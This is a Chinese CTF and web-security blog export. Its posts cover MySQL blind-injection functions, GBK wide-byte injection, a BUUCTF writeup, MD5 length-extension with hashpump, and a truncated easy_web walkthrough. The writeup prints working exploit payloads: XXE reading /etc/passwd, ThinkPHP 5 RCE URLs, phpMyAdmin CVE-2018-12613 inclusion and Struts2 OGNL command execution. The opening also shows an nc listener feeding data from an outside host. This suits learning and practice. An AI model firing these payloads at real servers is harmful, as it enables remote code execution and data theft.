<p>在请求包内添加:Proxy: 172.0.219.177:9999<br>然后在服务器172.0.219.177上执行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999 &lt; 1.txt</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>misc&amp;web</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql盲注常用函数</title>
    <url>/2020/03/02/mysql%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="mysql盲注常用函数"><a href="#mysql盲注常用函数" class="headerlink" title="mysql盲注常用函数"></a>mysql盲注常用函数</h1><a id="more"></a>
<h2 id="char-length-str-length-str"><a href="#char-length-str-length-str" class="headerlink" title="char_length(str),length(str)"></a>char_length(str),length(str)</h2><p>计算字符长度</p>
<p>eg:select length(database());</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| django     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(database());</span><br><span class="line">+--------------------+</span><br><span class="line">| length(database()) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  6 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.24 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(database())&gt;6;</span><br><span class="line">+----------------------+</span><br><span class="line">| length(database())&gt;6 |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure>

<h2 id="1-row-in-set-0-05-sec"><a href="#1-row-in-set-0-05-sec" class="headerlink" title="1 row in set (0.05 sec)"></a>1 row in set (0.05 sec)</h2><p>left(str,numbers)<br>从左开始截取字符串strnumber个字符</p>
<p>eg: select left(database(),2);</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| django     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select left(database(),2);</span><br><span class="line">+--------------------+</span><br><span class="line">| left(database(),2) |</span><br><span class="line">+--------------------+</span><br><span class="line">| dj                 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select left(database(),2)=&apos;dj&apos;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| left(database(),2)=&apos;dj&apos; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.10 sec)</span><br><span class="line">mysql&gt; select left(database(),2)=&apos;q&apos;;</span><br><span class="line">+------------------------+</span><br><span class="line">| left(database(),2)=&apos;q&apos; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      0 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="substring-str-start-number-substr-str-start-number"><a href="#substring-str-start-number-substr-str-start-number" class="headerlink" title="substring(str,start,number),substr(str,start,number)"></a>substring(str,start,number),substr(str,start,number)</h2><p>从start开始位置取出number个字符</p>
<p>eg:select substr((select database()),1,1);</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| django     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select substr((select database()),1,1);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| substr((select database()),1,1) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| d                               |</span><br><span class="line">+---------------------------------+</span><br><span class="line">1 row in set (0.43 sec)</span><br><span class="line">mysql&gt; select substr((select database()),1,1)=&apos;a&apos;;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| substr((select database()),1,1)=&apos;a&apos; |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   0 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select substr((select database()),1,1)=&apos;d&apos;;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| substr((select database()),1,1)=&apos;d&apos; |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="mid-str-start-number"><a href="#mid-str-start-number" class="headerlink" title="mid(str,start,number)"></a>mid(str,start,number)</h2><p>从start开始位置取出number个字符</p>
<p>eg:select mid(database(),1,1);</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| django     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select mid(database(),1,1);</span><br><span class="line">+---------------------+</span><br><span class="line">| mid(database(),1,1) |</span><br><span class="line">+---------------------+</span><br><span class="line">| d                   |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select mid(database(),2,2);</span><br><span class="line">+---------------------+</span><br><span class="line">| mid(database(),2,2) |</span><br><span class="line">+---------------------+</span><br><span class="line">| ja                  |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="ord-str"><a href="#ord-str" class="headerlink" title="ord(str)"></a>ord(str)</h2><p>字符串第一位字符的ascii码</p>
<p>eg:select ord(database());</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| django     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select ord(database());</span><br><span class="line">+-----------------+</span><br><span class="line">| ord(database()) |</span><br><span class="line">+-----------------+</span><br><span class="line">|             100 |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.43 sec)</span><br><span class="line">mysql&gt; select ord(&apos;a&apos;);</span><br><span class="line">+----------+</span><br><span class="line">| ord(&apos;a&apos;) |</span><br><span class="line">+----------+</span><br><span class="line">|       97 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select ord(database())=100;</span><br><span class="line">+---------------------+</span><br><span class="line">| ord(database())=100 |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   1 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select ord(database())=0;</span><br><span class="line">+-------------------+</span><br><span class="line">| ord(database())=0 |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 0 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="ascii-str"><a href="#ascii-str" class="headerlink" title="ascii(str)"></a>ascii(str)</h2><p>取出最左侧的第一位字符的ascii码</p>
<p>eg:select ascii(database());</p>
<p>基本上同ord()函数.</p>
<h2 id="limit-m-n-限制输出"><a href="#limit-m-n-限制输出" class="headerlink" title="limit m ,n 限制输出"></a>limit m ,n 限制输出</h2><p>从第m(m从0开始)位字符开始取出n个字符</p>
<p>eg:select username from users limit 0,1;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select name from login_user;</span><br><span class="line">+---------+</span><br><span class="line">| name    |</span><br><span class="line">+---------+</span><br><span class="line">| HORIZON |</span><br><span class="line">| lenovo  |</span><br><span class="line">| tbw     |</span><br><span class="line">+---------+</span><br><span class="line">3 rows in set (0.38 sec)</span><br><span class="line">mysql&gt; select name from login_user limit 0,1;</span><br><span class="line">+---------+</span><br><span class="line">| name    |</span><br><span class="line">+---------+</span><br><span class="line">| HORIZON |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select name from login_user limit 2,2;</span><br><span class="line">+------+</span><br><span class="line">| name |</span><br><span class="line">+------+</span><br><span class="line">| tbw  |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select name from login_user limit 0,2;</span><br><span class="line">+---------+</span><br><span class="line">| name    |</span><br><span class="line">+---------+</span><br><span class="line">| HORIZON |</span><br><span class="line">| lenovo  |</span><br><span class="line">+---------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="updatexml-XML-document-XPath-string-new-value"><a href="#updatexml-XML-document-XPath-string-new-value" class="headerlink" title="updatexml(XML_document,XPath_string,new_value)"></a>updatexml(XML_document,XPath_string,new_value)</h2><p>updatexml()函数只截取了特殊字符以后的字符,这时就需要构造特殊字符如反引号:`,波浪号:~,再将查询的结果结合这些特殊字符就会从最开始的特殊字符(包括特殊字符)开始截取,最大32位</p>
<p>eg:select updatexml(1,concat(‘<del>‘,(select database()),’</del>‘),1);</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(&apos;~&apos;,(select database()),&apos;~&apos;),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~django~&apos;</span><br></pre></td></tr></table></figure>

<h2 id="count"><a href="#count" class="headerlink" title="count (*)"></a>count (*)</h2><p> 计算数量</p>
<p>eg:select count(*) from users;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select schema_name from information_schema.schemata;</span><br><span class="line">+---------------------------+</span><br><span class="line">| SCHEMA_NAME               |</span><br><span class="line">+---------------------------+</span><br><span class="line">| mysql                     |</span><br><span class="line">| information_schema        |</span><br><span class="line">| performance_schema        |</span><br><span class="line">| sys                       |</span><br><span class="line">| django                    |</span><br><span class="line">| ssh                       |</span><br><span class="line">| jspmlsgswhsg5576b2b6mysql |</span><br><span class="line">+---------------------------+</span><br><span class="line">7 rows in set (0.11 sec)</span><br><span class="line">mysql&gt; select count(*) from information_schema.schemata;</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        7 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.14 sec)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-宽字节注入</title>
    <url>/2020/02/27/sqli-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="0x00背景"><a href="#0x00背景" class="headerlink" title="0x00背景"></a>0x00背景</h1><a id="more"></a>
<ol>
<li>当某字符的大小为一个字节时，称其字符为窄字节.</li>
<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
<li>所有英文默认占一个字节，汉字占两个字节</li>
<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等.</li>
<li>在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。<h1 id="0x01-宽字节注入原理"><a href="#0x01-宽字节注入原理" class="headerlink" title="0x01 宽字节注入原理"></a>0x01 宽字节注入原理</h1>程序员为了防止sql注入，对用户输入中的单引号（’）进行处理，在单引号前加上斜杠（\）进行转义，这样被处理后的sql语句中，单引号不再具有‘作用’，仅仅是‘内容’而已，换句话说，这个单引号无法发挥和前后单引号闭合的作用，仅仅成为‘内容‘.</li>
</ol>
<p>而安全测试人员要绕过这个转义处理，使单引号发挥作用，有两个思路：</p>
<ol>
<li>让斜杠（\）失去作用</li>
<li>让斜杠（\）消失<h1 id="0x03宽字节注入的前提条件"><a href="#0x03宽字节注入的前提条件" class="headerlink" title="0x03宽字节注入的前提条件"></a>0x03宽字节注入的前提条件</h1>要有宽字节注入漏洞</li>
</ol>
<p>1、首先要满足目标程序使用双/多字节字符集进行解析</p>
<p>2、其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\。</p>
<p>宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象</p>
<h1 id="0x04简单的例子"><a href="#0x04简单的例子" class="headerlink" title="0x04简单的例子"></a>0x04简单的例子</h1><p>首先尝试加’:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xxxxx?name=hello%27</span><br></pre></td></tr></table></figure>

<p>name值会在js中，但是输入的单引号被转义了，没办法逃逸<br>然后翻看了下页面源码及请求头，发现客户端编码是gbk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content-type:charset=gbk</span><br></pre></td></tr></table></figure>

<p>想必是宽字节注入了，尝试输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello%df%27</span><br></pre></td></tr></table></figure>

<p>没错了，就是宽字节了，console都报错提示引号未闭合了，后面就是构造而外的js代码，并把后面的对于字符注释掉，让语法正确.</p>
<h1 id="0x05宽字节注入的预防"><a href="#0x05宽字节注入的预防" class="headerlink" title="0x05宽字节注入的预防"></a>0x05宽字节注入的预防</h1><p>最后，网站如何才能防止这种宽字符注入攻击呢？</p>
<p>（1）使用mysql_set_charset(GBK)指定字符集</p>
<p>（2）使用mysql_real_escape_string进行转义</p>
<p>原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？就是使用mysql_set_charset进行指定。</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf real writeup</title>
    <url>/2020/02/13/buuctf%20real%20writeup/</url>
    <content><![CDATA[<h1 id="PHP-XXE"><a href="#PHP-XXE" class="headerlink" title="[PHP]XXE"></a>[PHP]XXE</h1><a id="more"></a>
<p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡</p>
<p>dom.php、SimpleXMLElement.php、simplexml_load_string.php均可触发XXE漏洞</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">	&lt;!ELEMENT name ANY &gt;</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">	&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h1 id="ThinkPHP-5-Rce"><a href="#ThinkPHP-5-Rce" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h1><p>Thinkphp5 5.0.22/5.1.29远程代码执行漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br><span class="line">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure>

<p>通过读取phpinfo，获取到flag！！</p>
<h1 id="ThinkPHP-5-0-23-Rce"><a href="#ThinkPHP-5-0-23-Rce" class="headerlink" title="[ThinkPHP]5.0.23-Rce"></a>[ThinkPHP]5.0.23-Rce</h1><p>Thinkphp 5.0.23远程代码执行漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=phpinfo&amp;server[REQUEST_METHOD]=-1&amp;method=get</span><br></pre></td></tr></table></figure>

<p>通过读取phpinfo，获取到flag！！<br>关于thinkphp5的漏洞github上有人已经收集并集中在一起了，</p>
<p> 附上链接：<a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">关于ThinkPHP框架的历史漏洞分析集合</a></p>
<h1 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h1><p>phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)</p>
<p>buuctf的warmup就是这个洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">http://node3.buuoj.cn:29957/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>当然这里是无法执行命令的，那么我们也就无法执行phpinfo()，也就无法获取到flag<br>看github我们可以知道，我们执行SELECT ‘<?=phpinfo()?>‘;，然后去查看session,</p>
<p>这个时候我们就可以去包含session文件了，这样就会执行session文件中的php代码.</p>
<h1 id="struts2-s2-013"><a href="#struts2-s2-013" class="headerlink" title="[struts2]s2-013"></a>[struts2]s2-013</h1><p>S2-013 / S2-014远程执行代码漏洞</p>
<p>受影响的版本：2.0.0-2.3.14.1</p>
<p>Struts2的标记&lt;s:a&gt;和&lt;s:url&gt;提供了includeParams属性，该属性的主要作用是了解是否包含http请求参数。</p>
<p>includeParams的允许值为：</p>
<p>无-网址中不包含任何参数（默认）</p>
<p>get-在URL中仅包含GET参数</p>
<p>全部-在网址中同时包含GET和POST参数</p>
<p>如果为includeParams=all，则此请求的GET和POST参数放在URL的GET参数上</p>
<p>在此过程中，参数将由OGNL表达式解析，导致命令执行</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>都需要进行url编码进行传递，执行env命令得到flag.</p>
<h1 id="struts2-s2-001"><a href="#struts2-s2-001" class="headerlink" title="[struts2]s2-001"></a>[struts2]s2-001</h1><p>S2-001远程执行代码漏洞</p>
<p>漏洞在于，当用户提交表单数据且验证失败时，服务器会使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据，例如在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%{value}对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>加在post的数据后面.</p>
<h1 id="struts2-s2-045"><a href="#struts2-s2-045" class="headerlink" title="[struts2]s2-045"></a>[struts2]s2-045</h1><p>S2-045远程执行代码漏洞（CVE-2017-5638）</p>
<p>Apache Struts2的Jakarta Multipart解析器插件中容易出现远程执行代码漏洞</p>
<p>使用此插件上传文件时，攻击者可能会更改HTTP请求的Content-Type标头字段的值以触发此漏洞，从而导致远程执行代码</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;env&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>进行抓包，修改content-Type:</p>
<h1 id="struts2-s2-007"><a href="#struts2-s2-007" class="headerlink" title="[struts2]s2-007"></a>[struts2]s2-007</h1><p>S2-007远程执行代码漏洞</p>
<p>当 -validation.xml配置的验证规则时</p>
<p>如果类型验证转换失败，则服务器将拼接用户提交的表单值字符串</p>
<p>然后执行OGNL表达式解析并返回</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;env&apos;).getInputStream())) + &apos;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>MD5扩展攻击</title>
    <url>/2020/02/07/MD5%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="0x00-MD5加密原理"><a href="#0x00-MD5加密原理" class="headerlink" title="0x00 MD5加密原理"></a>0x00 MD5加密原理</h1><a id="more"></a>
<p>MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p>
<h1 id="0x01-MD5拓展攻击目的"><a href="#0x01-MD5拓展攻击目的" class="headerlink" title="0x01 MD5拓展攻击目的"></a>0x01 MD5拓展攻击目的</h1><p>攻击场景：</p>
<p>1.假设我们实现文件下载file=filename&amp;hash=md5($key.filename)</p>
<p>然后判断hash是否等于md5($key.filename) 如果相等就进行下载</p>
<p>也就是说这里我们只要推出config.php 的md5($key.’config.php’)的hash</p>
<p>那么就可以实现任意下载config.php的功能</p>
<p>2.某ctf的题目 有点为出题而出题的意思</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>

<p>小结:就是在不知道key的具体值的时候 我们可以通过某些条件比如key的长度 某个已知明文通过MD5($key.已知明文)MD5值去推MD5($key.任意值)的MD5</p>
<h1 id="0x03-MD5扩展攻击的具体实现流程-例子分析-使用hashpump"><a href="#0x03-MD5扩展攻击的具体实现流程-例子分析-使用hashpump" class="headerlink" title="0x03  MD5扩展攻击的具体实现流程(例子分析,使用hashpump)"></a>0x03  MD5扩展攻击的具体实现流程(例子分析,使用hashpump)</h1><p><a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">www.shiyanbar.com/</a><a href="http://www.shiyanbar.com/ctf/1848" target="_blank" rel="noopener">ctf/1848</a></p>
<p>关键代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret=&quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</span><br><span class="line">$username=&quot;admin&quot;;</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line">if($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password)))&#123;</span><br><span class="line">    echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">    die (&quot;The flag is &quot;. $flag);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在题目里可以得到:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5($secret.&quot;adminadmin&quot;)的值为571580b26c65f306376d4f64e53cb5c7</span><br></pre></td></tr></table></figure>

<p>稍微整理下我们已经知道的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$secret是密文，长度为15，如果再算上后面第一个admin，长度就是20</span><br><span class="line">而数据是admin</span><br><span class="line">签名（哈希值）是571580b26c65f306376d4f64e53cb5c7</span><br></pre></td></tr></table></figure>

<p>这时候我们使用HashPump，附加数据至少1位以上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># hashpump</span><br><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: pcat</span><br><span class="line">或者直接</span><br><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat</span><br><span class="line">就会得到</span><br><span class="line">3e67e8f0c05e1ad68020df30bbc505f5</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00pcat</span><br></pre></td></tr></table></figure>

<p>第一个是新的签名，把它设置到cookies的getmein里。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第二个先把\x替换为%后，post提交</span><br><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00pcat</span><br></pre></td></tr></table></figure>

<p>就可以通过了。</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题之旅</title>
    <url>/2020/02/04/buuctf%20web%20%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85(2020%E5%AF%92%E5%81%87%E7%AF%87)/</url>
    <content><![CDATA[<h1 id="buuctf刷题之旅"><a href="#buuctf刷题之旅" class="headerlink" title="buuctf刷题之旅"></a>buuctf刷题之旅</h1><a id="more"></a>
<h2 id="2019-安洵杯-easy-web"><a href="#2019-安洵杯-easy-web" class="headerlink" title="2019 安洵杯 easy_web"></a>2019 安洵杯 easy_web</h2><ul>
<li>打开题目url格式:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://de23405a-b1df-4e54-b8e2-605671569ecd.node3.buuoj.cn/index.php?img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>怀疑有任意文件读取以及命令执行.img参数需要经过一次hex和两次base64.<br>读一下index.php:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">$cmd = $_GET[&apos;cmd&apos;];</span><br><span class="line">if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;])) </span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo 